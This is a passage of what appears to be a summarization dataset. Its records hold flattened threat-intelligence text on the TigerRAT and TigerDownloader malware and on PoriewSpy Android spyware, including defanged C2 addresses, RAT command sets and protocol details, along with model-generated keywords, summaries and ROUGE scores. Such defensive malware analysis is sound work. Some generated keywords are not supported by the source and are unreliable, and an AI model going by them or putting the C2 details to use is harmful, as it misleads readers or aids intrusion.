the significance, if any, underlying these names. Our findings are summarized in Figure 7, which shows the packing scheme common to all packed downloader and RAT variants we analyzed.Figure 7: Packing scheme common to all samples.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES10MALWARE FAMILIES AND VARIANTS In this section, we will establish through code reuse analysis that all the unpacked binaries fall into a downloader or RAT family. We are calling these families the TigerDownloader and TigerRAT malware family. These names were introduced in the KrCERT report to refer to the downloader and RAT components in their investigation. To get a quick understanding of the unpacked binaries, we have performed a combined cluster and code-reuse analysis. This analysis allows us to automatically identify malware families and malware variants within a family. The goal of this analysis is to gain a quick understanding of the relationship between binaries and to direct analysts to the relevant samples for further manual analysis to eventually understand the attacker\u2019s tooling and capabilities. The results of the cluster and code-reuse analysis are shown in Figure 8. The figure confirms that the unpacked binaries either fall into the TigerDownloader (blue) or TigerRAT (orange) family. Moreover, we see that each family has three variants (shown as large circles). We have used a cluster threshold of 97.5%, meaning that binaries which are at least 97.5% similar fall into the same cluster. The clusters in the graph consist of the so-called \u201ccluster representatives\u201d (large circles) and samples (small circles) directly connected to a cluster representative. The underlying idea is that the samples within a cluster are essentially identical and thus well represented by the cluster representative.Figure 8: Cluster and code-reuse analysis of the unpacked samples with their abbreviated hashes.We note that the choice of the cluster threshold has an obvious impact on the variants: A high threshold will reveal minor and more variants, while a low one reveals fewer and only major variants. We draw the following conclusions from the graphs:\u2022 There is no code reuse between the TigerDownloader and the TigerRAT family. We recall from the packer analysis that although the families are code-wise distinct, they are packed using the same packing scheme.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES11\u2022 Within the downloader family, there are three variants: one x86 and two x64 variants. The two x64 variants are very closely related (i.e., 97% code reuse) and thus are likely variants with minor differences.\u2022 Within the RAT family, we have a similar situation with three variants: one x86 and two x64. However, the two x64 variants only share 55% of their code and thus seem to be substantial RAT variants.The relations between the x64 and x86 binaries are lower, which is expected due to compiler and CPU architecture differences, but relevant code reuse can still be found. The table in Figure 9 shows the detailed composition of the clusters from the previous graphs. We also notice that some (hash-wise) unique packed samples result in (hash-wise) identical unpacked sample, reducing the effective diversity of the samples under consideration.Figure 9: Detailed cluster information.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES12In the following sections we will analyze the downloader and RAT variants in more detail, limiting our analysis to the cluster representatives. This ability to reduce analysis to cluster representatives is key for the directed and efficient analysis and tracking of malware variants. The choice of cluster representatives and their names used in the following analysis are shown in Figure 10. ClusterSample NameStageHash012345RAT (x64) 3rd stageRAT (x64) 3rd stageRAT-Kaspersky- 3rd stageRAT-Kaspersky- ce300458136c03165d20915ee658067Figure 10: Cluster representatives used in the subsequent analysis.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES13TIGERDOWNLOADER VARIANTS In this section, we take a closer look at the two downloader variants: Downloader-Malwarebytes-x64 and Downloader-Kaspersky-x64. From the cluster and code reuse analysis (see Figure 8) we know that they share 97% of code and thus are minor variants of the TigerDownloader family. Using the binary diffing capabilities of our analysis toolchain, we see in Figure 11 that the samples are largely made up of the same functions, except for one unique function (the one with the address 0x140001230) in the Kaspersky (Downloader-Kaspersky-x64) sample.Figure 11: Function level diff between Downloader-Kaspersky-x64 and Downloader-Malwarebytes-x64.Analyzing the downloader sample from Kaspersky (see Figure 12), we see that the unknown function (0x140001230) is called from the main function of the downloader.Figure 12: Left, Downloader-Kaspersky-x64; right, Downloader-Malwarebytes-x64.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES14It turns out that this function is used to achieve persistence. The technique being used is straightforward and consists of creating a link in the current user startup folder to make sure that the downloader is started upon reboot of a victim machine (see Figures 13 and 14).Figure 13: Function which creates a shortcut for persistence.Figure 14: Shortcut to persistent executable.Finally, we note that we haven\u2019t found any persistence techniques in the Downloader-Malwarebytes- x64 sample. The reason is likely to minimize indicators being left on victim machines.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES15POSSIBLE CONNECTIONS TO THE KRCERT TIGERDOWNLOADER report is not available publicly, thus we could not include it into our analysis. To nevertheless examine possible relations between KrCERT and the Malwarebytes and Kaspersky downloaders, we attempted to connect them purely based on the artifacts and behaviors publicly reported by KrCERT. Let\u2019s start with a negative result. KrCERT reports a couple of C2 commands which they have found in their downloader (see Figure 15). We couldn\u2019t find any of the \u201cTiger10X\u201d identifiers in the downloaders at our disposal. Neither were we able to find any other identifiers which could be possible C2 commands.IdentifierActionTiger101Tiger102Tiger103Send victim infoReceive commandFile uploadFigure 15: TigerDownloader C2 commands reported by KrCERT.On the other hand, we have found various aspects reported by KrCERT that are also present in the other downloaders:\u2022 The packer in the KrCERT reports fits into the packer scheme which we have establishedabove.observed in our samples.\u2022 KrCERT reports that the communication is encoded using Base64, which we have also\u2022 The 3rd stages (RATs) which are downloaded by the 2nd stages (downloaders) all belong tothe same TigerRAT family (as we shall establish in the following section).In a nutshell, the observations above suggest that the KrCERT Downloader might be related to the downloaders observed by Malwarebytes and Kaspersky. However, this is speculative because we lack hard evidence since we don\u2019t have access to the KrCERT sample.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES16TIGERRAT VARIANTS We recall from the code reuse and cluster analysis (see Figure 8) that we could connect all RATs to the same TigerRAT family through code-reuse analysis. We have also seen that there are RAT variants that differ more substantially than the downloader variants. For instance, the variants RAT-Kaspersky- x64 and RAT-KrCERT-x64 share only about 50% of their code. In this section, we take a closer look at the RAT variants. We present strong new evidence on the functional and design levels that further attributes the RAT variants at our disposal to the same TigerRAT malware family. We also show that variants mainly differ in terms of the C2 commands they implement. For this analysis, we\u2019ll focus on the representatives RAT-Kaspersky-x64, RAT-KrCERT-x64 and RAT- Kaspersky-x86 which we established earlier (see Figure 10). COMMANDS AND CAPABILITIES PER VARIANT Let\u2019s look at the C2 commands which we have found in the different variants. Figure 16 shows all the C2 commands that we have observed in at least one of the three RAT variants. The absence of the commands with the ids 0x08 and 0x09 lead us to speculate that there are yet unknown samples in the wild which do include these commands.CommandIDSelfDeleteSystemInfoShellFileManagerKeyloggerSocksTunnelScreenCapturePortForwarder0x010x020x030x040x050x060x070x0aFigure 16: Summary of all C2 commands which are available in at least one of the three RAT variants.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES17Next, we\u2019re looking at the C2 commands which are supported by the different variants (see Figure 17).RAT variantCommandsRAT-Kaspersky-x86FileManager, ScreenCapture, SelfDelete, ShellRAT-Kaspersky-x64FileManager, Keylogger, ScreenCapture, SelfDelete, Shell, SocksTunnel, SystemInfoRAT-KrCERT-x64FileManager, Keylogger, PortForwarder, ScreenCapture, SelfDelete, Shell, SocksTunnel, SystemInfoFigure 17: C2 commands found in the different RAT variants.We see that the three variants which we have automatically identified using cluster analysis are indeed three functionally distinct variants. Apart from these variations in C2 capabilities, the core code of the variants is largely identical. Thus, it is essentially the C2 commands that define the three variants. We also observe that the four commands \u201cFileManager,\u201d \u201cScreenCapture,\u201d \u201cSelfDelete\u201d and \u201cShell\u201d are common to all variants. A COMMON INTERFACE FOR C2 COMMANDS We have found an interface that is common to all three variants, as follows: _DWORD id; // Command id t_MainStructure *MainStructure; _BYTE unk_data[0x10]; void (*init)(t_Module_GenericCommandInterface *a1); void (*execute)(t_Module_GenericCommandInterface *a1); void (*enable)(t_Module_GenericCommandInterface *a1); void (*disable)(t_Module_GenericCommandInterface *a1); void *enabled; };The interface provides an abstraction that is implemented by all C2 commands found in the RATs. This common interface establishes a strong relation between the variants within their core C2 functionalities.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES18NEW C2 PROTOCOL VARIANT IN RAT-KRCERT-X64 The C2 protocol is essentially identical across all variants. The exception is a minor protocol change which we spotted in the RAT-KrCERT-x64 variant. The change concerns the registration of the malware with the C2 and consists of an extra check located in the TCP module, which is responsible for all communication with the C2:struct t_TCP { void (*constructor)(t_Module_TCP *a1); void (*set_cncs)(t_Module_TCP *a1); void (*connect_to_cnc)(t_Module_TCP *a1); void (*check_response_from_cnc)(t_Module_TCP *a1); void (*listen_to_new_commands)(t_Module_TCP *a1); void (*close_socket)(t_Module_TCP *a1); void (*send_data)(t_Module_TCP *a1, t_EncData *a2, int a3); void (*process_recv_command)(t_Module_TCP *a1); void (*enable_commands)(t_Module_TCP *a1); struct t_TCP_Variant_KrCERT-x64 { void (*constructor)(t_Module_TCP *a1); void (*set_cncs)(t_Module_TCP *a1); void (*connect_to_cnc)(t_Module_TCP *a1); void (*check_response_from_cnc)(t_Module_TCP *a1); void (*new_check_from_cnc_response)(t_Module_TCP *a1); // new in RAT-KrCERT-x64 variant void (*listen_to_new_commands)(t_Module_TCP *a1); void (*close_socket)(t_Module_TCP *a1); void (*send_data)(t_Module_TCP *a1, t_EncData *a2, int a3); void (*process_recv_command)(t_Module_TCP *a1); void (*enable_commands)(t_Module_TCP *a1); void *var_1; };In Figure 18, the red rectangle contains the new protocol check which was added to the RAT-KrCERT- x64 variant.Figure 18: Left, other variants; right, RAT-KrCERT-x64 variant.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES19The new function essentially sends a 17-byte length chunk to the C2. We have not analyzed what data is sent, but it looks like it could be related to a bot identifier or something similar. Once the data is sent, it checks that the C2 returns the string \"n0gyPPx\" (see Figure 19).Figure 19: C2 protocol check for \"n0gyPPx.\"In addition to this protocol change, we have also observed a change in the HTTP header that is sent at the beginning of the communication in the very first request by the RAT-KrCERT-x64 variant (see Figure 20).RAT variantHTTP headerRAT-KrCERT-x64HTTP 1.1 /index.php?member=sbi2009 SSL3.3.7RAT-KrCERT-x64, RAT-Kaspersky-x86HTTP 1.1 /member.php SSL3.4Figure 20: HTTP header variants.Based on this protocol analysis, we believe that RAT-KrCERT-x64 is a slightly newer version of the RAT which is at the same time clearly related to the other versions.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES20CONCLUSIONS Our analysis revealed new evidence and insights enabling us to attribute the previously reported Andariel APT binaries by Malwarebytes, Kaspersky and KrCERT to two new malware families. We call these the TigerDownloader and TigerRAT families, using names originally introduced by KrCERT. We have also seen that all the binaries are related by the same packing scheme. Our results are based on both automated code-reuse analysis and manual analysis of the malware tooling reported in the previous reports. To facilitate further research and defense capabilities, we are sharing our unpacking and config- extraction scripts as well as data with the community (url The analysis in this report is based on the malware samples at our disposal at the time of writing. During our analysis, we found indicators suggesting that additional, not yet publicly known, variants may exist. Since threat analysis and attribution is data driven and evolving work, additional samples may complete our current findings or lead to new findings. We invite you to contact us with additional information, particularly if you can share suspected or confirmed TigerDownloader or TigerRAT binaries.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES21APPENDIX ALLEGED COMPILATION DATES We have looked at the compilation timestamps of the packed samples and concluded that they are randomly chosen. For instance, some timestamps are in the future (e.g., \u201c2024/06/09\u201d) and others many years in the past (e.g., \u201c1996/10/17\u201d). On the other hand, we have found that the compilation dates of the unpacked samples appear reasonable and likely correspond to the effective compilation dates. In fact, the unpacked compilation timestamp is always before the first seen date. In many cases, it is 1 to 2 days before the first seen date which makes sense due to the time delay between the infection/detection and reporting/submission to platforms like VirusTotal. Also, none of the dates are in the future or unrealistically old. While these still could be false flags, it is reasonable to assume that the compilation dates of the unpacked samples correspond to their effective production date. We also see that most of the 3rd stage (TigerRAT) samples were detected before the 2nd stage (TigerDownloader) samples. This could indicate that until a host becomes infected by the 3rd stage, the 2nd stage samples are not detected. It could also be due to the fact that 2nd stage samples are stealthier and have fewer features/functions. The raw data is shown in the table below.Packed hashUnpackedhashArch.StageCompilationCompilationx64Downloader (2nd stage)f4765f7b089d 1996-04-05time(unpacked sample) 2020-12-13First seen (packed)First seen (unpacked)2021-04-21 2021-06-19x64Downloader (2nd stage)1996-10-172020-12-032021-04-13 2021-04-22x64Downloader (2nd stage)1996-10-172020-12-032021-04-20 2021-04-22x64Downloader (2nd stage)1996-04-052020-12-112021-04-19 2021-04-19ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES226310cd9f8b6a (2nd stage)1996-04-052020-12-112021-04-19 2021-04-19x64Downloader (2nd stage)1996-04-052020-12-112021-05-11 2021-04-19x64x64Downloader persistence)1996-10-132020-11-242021-04-27 2021-04-271996-10-132020-11-242021-04-27 2021-04-271996-10-132020-11-242021-04-28 2021-04-27x86Downloader (2nd stage)1996-09-082020-07-202020-07-22 2020-07-22x64RAT (3rd stage)2023-11-282020-10-182020-10-19 2021-06-17x64RAT (3rd stage \u2013 Variant 3)1997-09-302021-01-182021-06-30 2021-10-21ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES23d231f3b6d6e Variant 3)RAT (3rd stage \u2013 Variant 3)RAT (3rd stage \u2013 Variant 2)RAT (3rd stage \u2013 Variant 2)RAT (3rd stage \u2013 Variant 2)RAT (3rd stage \u2013 Variant 2)RAT (3rd stage \u2013 Variant 2)RAT (3rd stage \u2013 Variant 2)2021-10-122020-12-132021-04-21 2021-06-211997-04-292020-11-242021-04-21 2021-04-211995-08-152020-09-212020-09-26 2021-06-172024-06-092021-01-112021-01-21 2021-01-212024-06-092021-01-112021-01-25 2021-01-212024-06-092021-01-112021-01-25 2021-01-212024-06-092021-01-112021-01-25 2021-01-212024-06-092021-01-112021-01-25 2021-01-21ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES24-87f389d8f3a6 Variant 2)RAT (3rd stage \u2013 Variant 1)RAT (3rd stage \u2013 Variant 1)RAT (3rd stage - Variant 1)RAT (3rd stage \u2013 Variant 1)RAT (3rd stage \u2013 Variant 1)RAT (3rd stage \u2013 Variant 1)RAT (3rd stage \u2013 Variant 1)2021-01-112021-01-252000-07-072020-08-272020-09-24 2020-09-242000-07-072020-08-272020-09-25 2020-09-252000-07-072020-08-272020-09-25 2020-09-252000-07-072020-08-272020-09-24 2020-09-242000-07-072020-08-272020-09-24 2020-09-242000-07-072020-08-272020-09-24 2020-09-242000-07-072020-08-272020-09-25 2020-09-25ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES250dc3f66f4af32 Variant 1)RAT (3rd stage \u2013 Variant 1)464eaa82103f ee6580672000-07-072020-08-272020-09-24 2020-09-242000-07-072020-08-272020-09-24 2020-09-24ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES26EXTRACTED C2S Another indicator to group these samples could be the C2 used by each sample. To do so, we created a config extractor for these samples. The following table shows the C2s for each sample. The 2nd stage samples use a domain whereas the 3rd stage samples directly use an IP address. NOTE: In the configuration of the 3rd stage there are 4 hardcoded IPs. In almost all cases, three of them are the same IP which belong to the C2. The remaining IP is empty in some cases, and in following table. You can find the \u201craw\u201d configuration here: url hxxp://mail.neocyon.com/jsp/user/sms/sms_recv.jspUnpacked hashf32f6b229913d68daad937c stage)RAT (3rd stage)RAT (3rd stage)RAT (3rd stage)ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES271177105e51fa02f9977bd43 stage)x64 Downloa x86hxxp://www.jinjinpig.co.kr/Anyboard/skin/board.php hxxp://mail.namusoft.kr/jsp/user/eam/board.jsphxxp://snum.or.kr/skin_img/skin.php hxxp://www.ddjm.co.kr/bbs/icon/skin/skin.phphxxp://www.jinjinpig.co.kr/Anyboard/skin/board.php hxxp://mail.namusoft.kr/jsp/user/eam/board.jsphxxp://www.conkorea.com/cshop/banner/list.php hxxp://www.allamwith.com/home/mobile/list.phpESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES28MITRE ATT&CK MAPPING The table below shows the MITRE ATT&CK Mapping after combining all these attacks/campaigns from previous reports and our analysis.TechniqueTacticTechnique NameT1584.006Resource DevelopmentCompromise Infrastructure: Web ServicesT1583.003Resource DevelopmentAcquire Infrastructure: Virtual Private ServerT1566.001Initial AccessPhishing: Spearphishing AttachmentT1189Initial AccessDrive-by CompromiseT1204.002ExecutionT1059.007ExecutionUser Execution: Malicious FileCommand and Scripting Interpreter: JavaScriptT1036.005Defense EvasionMasquerading: Match Legitimate Name or LocationT1027.003Defense EvasionObfuscated Files or Information: SteganographyT1497.001Defense EvasionVirtualization/Sandbox Evasion: System ChecksT1049T1057T1113DiscoveryDiscoveryCollectionSystem Network Connections DiscoveryProcess DiscoveryScreen CaptureT1056.001CollectionInput Capture: KeyloggingT1071.001Command and ControlApplication Layer Protocol: Web ProtocolsT1095Command and ControlNon-Application Layer ProtocolT1573.001Command and ControlEncrypted Channel: Symmetric CryptographyT1041T1486ExfiltrationImpactExfiltration Over C2 ChannelData Encrypted for ImpactESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES29ABOUT THREATRAYThreatray is a novel malware analysis and intelligence platform. We support all key malware defense use cases, including identification / detection, hunting, response, and analysis. Threatray helps security teams of all skill levels to effectively identify and analyze ongoing and past compromises. At the core of Threatray are highly scalable code similarity search algorithms that find code reuse between a new and millions of known samples in seconds. Our core search algorithms do not make use of traditional byte pattern matches and are thus highly resilient to code mutations. Our user facing features are based on the core search technology. They include best of class threat family identification and detection, easy to use real-time retro-hunting and retro-detection, cluster analysis to quickly find relevant IOCs, and low-level multi-binary analysis capabilities. Some of our binary analysis capabilities have been used for the research presented in this report. Contact us at url or url THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES30 ", "generated_text": "the report; TIGERRAT; a subgroup; the Lazarus group; South Korean entities; APT; APT; WannaSpy; Kaspersky; TigerDownloader; TigerRAT payloads; exploits; mode; keylogging; arbitrary commands; files; malware samples; modifications; the RAT; techniques; the tools; code reuse; functional commonalities; the samples; the attacks; RAT payloads; persistence capabilities; the attacks; the process; the malware; RAT payloads; code reuse; variants; the same downloader; RAT payloads; RAT payloads; the attacks; detail; the malware tools; the same downloader; RAT payloads; antivirus software; NetBit; Metasploit; information; detection; detection; detection; code reuse; an analysis; indicators; compromise; the attacks.", "ref_text": "<START-1>The report analyzes malware families called TigerRAT and TigerDownloader used in attacks on South Korean entities attributed to the Andariel APT group. It builds on previous research by Malwarebytes, Kaspersky, and the Korean CERT on these attacks. The report finds all malware samples are related through a common packing scheme, though the downloader and RAT families are code-wise distinct. It identifies 3 variants of the TigerRAT and 2 of the TigerDownloader through code reuse analysis. The TigerDownloader variants mainly differ in whether persistence is achieved. The TigerRAT variants differ more substantially in their command and control capabilities. But they share an interface for C2 commands and minor protocol differences, evidencing evolution of the malware. Enrichment of infrastructure links and C2s is provided to facilitate further research. The report concludes by mapping the malware capabilities to MITRE ATT&CK techniques across the full attack chain from infrastructure compromise to data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.22641509433962265, "t5/word/hint_hit_recall": 0.12080536912751678, "gpt3/lexical/rouge_rouge1": 0.51985559566787, "gpt3/lexical/rouge_rouge2": 0.15999999999999998, "gpt3/lexical/rouge_rougeL": 0.2815884476534296, "gpt3/lexical/rouge_rougeLsum": 0.2815884476534296, "gpt3_generated_text": ["The article discusses the establishment of the TigerRAT and TigerDownloader malware families, which have been used in recent cyber attacks targeting South Korean entities. These attacks have been attributed to the Andariel APT group, a subgroup of the Lazarus cybercrime group. The malware tools, including RAT payloads and downloaders, exhibit code reuse and functional commonalities, indicating a connection between the attacks. Different variants of the tools have been identified, with distinct capabilities such as keylogging, executing arbitrary commands, and exfiltrating files. The article provides an in-depth analysis of the malware samples and their modifications, shedding light on the techniques and tools used by the threat actor. The research aims to enhance understanding and detection of these malware families to improve defense capabilities against future attacks."]}, {"split_name": "val", "sample_id": "val_57", "prompt_text": "Extract the keywords: Trend Micro About TrendLabs Security Intelligence Blog Home Search:CategoriesHome \u00bb Mobile \u00bb Hacking Group Spies on Android Users in India Using PoriewSpy Hacking Group Spies on Android Users in India Using PoriewSpy Posted on: January 29, 2018 at 12:00 am Posted in: Mobile, Targeted Attacks Author: Mobile Threat Response Team0by Ecular Xu and Grey Guo We have been seeing attacks that spy on and steal data from speci\ufb01c targets on the mobile platform since late 2017. We discovered the malicious apps victimizing Android users in India, and believe a hacking group\u2014one previously known for victimizing government of\ufb01cials\u2014carried out the attacks. We identi\ufb01ed these malicious apps as PoriewSpy (detected by Trend Micro as ANDROIDOS_PORIEWSPY.HRX). We also suspect that the group used malicious apps built using DroidJack or SandroRAT (detected as ANDROIDOS_SANRAT.A), based on similarities in their command-and-control (C&C) server. DroidJack is a remote access Trojan (RAT) that allows intruders to take full control of a user\u2019s Android device when installed. The operators behind these malicious apps might be related to a suspected cyberespionage group discovered in 2016, but it\u2019s possible that the group may be launching different attacks unrelated to their previous campaign. PoriewSpy turns device into an audio recorder, steals other device info Existing as far back as 2014, PoriewSpy steals sensitive information from victims\u2019 devices such as SMS, call logs, contacts, location, and SD card \ufb01le list. It can also record victims\u2019 voice calls. The malware was developed from an open-source project called android-swipe-image-viewer, or Android Image Viewer, which the malware operator/s modi\ufb01ed to add the following components: Permissions android.permission.INTERNET android.permission.RECORD_AUDIO android.permission.ACCESS_NETWORK_STATE Allows applications to access information about networks android.permission.READ_SMS android.permission.READ_LOGS android.permission.GET_ACCOUNTS android.permission.READ_CONTACTS android.permission.READ_CALL_LOG android.permission.READ_PHONE_STATE android.permission.WRITE_EXTERNAL_STORA GE android.permission.READ_EXTERNAL_STORAG E android.permission.RECEIVE_BOOT_COMPLETE DAllows applications to read SMS messages Allows applications to read the low-level system log \ufb01les Allows access to the list of accounts in the Accounts Service Allows applications to read the user\u2019s contacts data Allows applications to read the user\u2019s call log. Allows read only access to phone state Allows applications to write to external storage.Allows applications to open network sockets Allows applications to record audioAllows applications to read from external storage.Allows applications to receive the ACTION_BOOT_COMPLETED that is broadcast after the system \ufb01nishes booting Allows applications to collect battery statisticsandroid.permission.BATTERY_STATS aandroid.permission.ACCESS_FINE_LOCATION Allows applications to access \ufb01ne(e.g., GPS) location Allows applications to access information about Wi-Fi android.permission.ACCESS_WIFI_STATE networks Allows applications to access coarse (e.g., Cell-ID, WiFi) locationandroid.permission.ACCESS_COARSE_LOCATIO N android.permission.ACCESS_MOCK_LOCATION Allows applications to create mock location providers forandroid.permission.CHANGE_NETWORK_STATE Allows applications to change network connectivity state android.permission.CHANGE_WIFI_STATEAllows applications to change Wi-Fi connectivity statetestingFigure 1. Permissions added by the malware author/s to the modi\ufb01ed Android Image Viewer added by theServices PoriewSpy apps were automatically downloaded from malicious websites visited by users. When the malicious app is launched, it will initially show nude photos of an Indian actress, but will later hide its icon to obscure itself from users\u2019 sight. When the user calls using an infected device, the malware will start recording the audio, which it saves to /sdcard/.googleplay.security/ named as \u201c_VoiceCall_\u201d + currentTime. It can also turn the mobile device into an audio recorder to timely record audio every 60 seconds even when the user is not having a phone call.malware author/s to the modi\ufb01edMain espionage component For log collection Audio recordAuto start after device reboot For device power connect action Handle Call actions Handle device network actions Handle Camera related actionsFigure 3. Code snippet of malware performing of\ufb02ine audio recording on user deviceApart from secretly recording audio using the affected device, the malware can also write and steal contacts, SMS, call logs, and location information.Figure 4. Code snippet of malware stealing contacts from user deviceFigure 5. Code snippet of malware stealing SMS content from user deviceFigure 6. Code snippet of malware stealing call logs from user deviceFigure 7. Code snippet of malware accessing url to steal the user device\u2019slocation related to its IP address. Note: the malware can still compromise the user even when theyare outside India or South Asia.Figure 8. Code snippet of malware stealing location information from user device through GPS ornetworkIn our research, we also found a malicious app, named after an Indian model-actress, which bears similarities to the code of PoriewSpy apps. Created in 2014, we speculate that this is an earlier version of PoriewSpy that also shares the same C&C server with some of the latest ones. The malicious app is capable of stealing call logs, contacts, SMS, SD card \ufb01le list, and audio recording.Figure 9. Left: Con\ufb01guration code of the seemingly earlier version of PoriewSpy. Right:Con\ufb01guration code of the latest version of PoriewSpy.Malicious apps developed using DroidJack Apps built using DroidJack also appear to have been used by the hacking group behind PoriewSpy, based on the C&C servers they share. The operators disguised these DroidJack-built apps as freeCall, BatterySavor, Secure_Comm, and Nexus_Compatability. The malicious apps are capable of obtaining all necessary permissions for an Android device\u2019s main functions, including accessing, modifying, and executing calls, SMS, phonebook, camera, audio recorder, as well as enable or disable Wi-Fi connectivity. The C&C servers of PoriewSpy and DroidJack-built apps Some of PoriewSpy\u2019s C&C servers were located at 5[.]189[.]137[.]8 and 5[.]189[.]145[.]248, while some of the DroidJack-built apps\u2019 were at 93[.]104[.]213[.]217 and 88[.]150[.]227[.]71. Our research revealed that these four C&C servers were previously used by a hacking group who allegedly engaged in cyberespionage activities. The abused IPs 5[.]189[.]137[.]8, 5[.]189[.]145[.]248, and 93[.]104[.]213[.]217 can be traced back to a legitimate hosting service provider based in Germany. Meanwhile, 88[.]150[.]227[.]71\u2019s is in the UK. 62[.]4[.]2[.]211, the C&C server of the initial version of PoriewSpy used by some of the latest versions, belongs to a service provider in France. The hacking group also used draagon[.]ddns[.]net, located in South Asia.Figure 10. The chart above shows the connections between the C&C servers of PoriewSpy and DroidJack-built apps, and the suspected cyberespionage group. The green dots represent thecurrent malicious samples. IPs colored in yellow are the ones used by the group in their previouscampaign, while the ones in red are presumably the extension to the mobile platform.The period PoriewSpy and DroidJack-built apps became active also appear to match that of the hacking group\u2019s campaign. It was observed that the activities of the abovementioned mobile malware became active in late 2015 to early 2016, which was around the same period the hacking group\u2019s campaign was also active. Countermeasures Targeted attacks on mobile devices may be few compared to ones for desktops or PCs, but the discovery of PoriewSpy and other malicious apps that spy on the mobile platform should caution users of the threat that may come their way if their devices remain unsecured. Downloading only from legitimate app stores can prevent PoriewSpy and DroidJack-built apps from compromising your mobile device. It is also important to be aware of what apps are allowed to access, and to understand the risks before accepting any terms or granting certain permissions to apps. End users and enterprises can also bene\ufb01t from multilayered mobile security solutions such as Trend Micro\u2122 Mobile Security for Android\u2122 which is also available on Google Play. For organizations, Trend Micro\u2122 Mobile Security for Enterprise provides device, compliance and application management, data protection, and con\ufb01guration provisioning, as well as protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites. Trend Micro\u2019s MARS covers Android and iOS threats using leading sandbox and machine learning technologies. It can protect users against malware, zero-day and known exploits, privacy leaks, andApp Label com.google.sec urity com.google.sec urity com.google.sec urity com.google.sec urity com.google.sec urity com.google.sec com.sqisland.android.swipe_im age_viewer com.sqisland.android.swipe_im age_viewer com.sqisland.anwdroid.sipe_im age_viewer com.sqisland.android.swipe_im age_viewer com.sqisland.android.swipe_im age_viewer com.sqisland.android.swipe_im age_viewer net.droidjack.serverapplication vulnerability. We disclosed our \ufb01ndings to Google, who stated that none of the abovementioned malicious apps are on Google Play. Updates were made to Google Play Protect to defend against new and existing similar threats. Indicators of Compromise (IOCs) C&C servers 74[.]208[.]102[.]80 5[.]189[.]137[.]8 5[.]189[.]145[.]248 93[.]104[.]213[.]217 draagon[.]ddns[.]net 88[.]150[.]227[.]71 62[.]4[.]2[.]211 Related Posts: GhostClicker Adware is a Phantomlike Android Click Fraud Toast Overlay Weaponized to Install Several Android Malware April Android Security Bulletin Addresses Critical H.264 and H.265 Decoder Vulnerabilities Untangling the Patchwork Cyberespionage Groupnet.droidjack.serverSannia_Secrets Shivali Rastogicom.poonam.pandaynet.droidjack.serverNexus_Compat ability Rabia_Secrets net.droidjack.serverBatterySavor net.droidjack.serverSecure_Comm net.droidjack.serverLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags: PoriewSpyComments for this thread are now closed.0 CommentsTrendLabsRecommend\uf108Share\u2924Login\ue6031 Sort by BestSubscribe\u2709dAdd Disqus to your siteAdd DisqusAddPrivacy Home and Home Of\ufb01ce About Trend Micro Asia Paci\ufb01c Region (APAC): Australia / New Zealand, , , \ub300\ud55c\ubbfc\uad6d,  Latin America Region (LAR): Brasil, M\u00e9xico North America Region (NABU): United States, Canada Europe, Middle East, & Africa Region (EMEA): France, Deutschland / \u00d6sterreich / Schweiz, Italia, \u0420\u043e\u0441\u0441\u0438\u044f, Espa\u00f1a, United Kingdom / IrelandPrivacy Statement Legal Policies Copyright \u00a9 2018 Trend Micro Incorporated. All rights reserved. ", "generated_text": "Android users; late 2017; The malware; PoriewSpy; a hacking group; government officials; apps; Android images; photos; contacts; location; Android network; RATs; DroidJack; SandroRAT; similarities; their command; control; servers; infrastructure; devices; audio; calls; the app; a remote access Trojan; RATs; commands; control; control; servers; the attackers; the malware; phishing emails; files; the ATT&CK command; the victim; the attackers; a custom hacking framework; an open source project; the Android Image Viewer.", "ref_text": "<START-1>The PDF describes a malware campaign targeting Android users in India called PoriewSpy. It was discovered in late 2017 and is believed to be created by a hacking group previously known for targeting government officials. PoriewSpy is capable of recording audio, stealing contacts, SMS messages, call logs, location data, and other sensitive information from infected devices. It disguises itself as a nude photo app but then hides its icon. The malware turns the device into an audio recorder, secretly recording the user even when not on a call. The hackers also used separate malicious apps built with the DroidJack RAT that share command and control infrastructure with PoriewSpy. These apps masquerade as legitimate apps and request extensive permissions to fully control the device. The report analyzes the code of PoriewSpy and its evolution over time. It uncovers the IP addresses of the command and control servers, several of which were previously used by the suspected hacking group in cyberespionage campaigns. The PDF provides indicators of compromise and recommendations for mobile security solutions to detect and block similar malware. It highlights that targeted mobile malware attacks are rising and users should only install apps from trustworthy sources and be cautious of permissions requested. <END-1>", "t5/keyword/hint_hit_precision": 0.375, "t5/word/hint_hit_recall": 0.10396039603960396, "gpt3/lexical/rouge_rouge1": 0.5438066465256798, "gpt3/lexical/rouge_rouge2": 0.1702127659574468, "gpt3/lexical/rouge_rougeL": 0.2175226586102719, "gpt3/lexical/rouge_rougeLsum": 0.2175226586102719, "gpt3_generated_text": ["In late 2017, a hacking group targeted 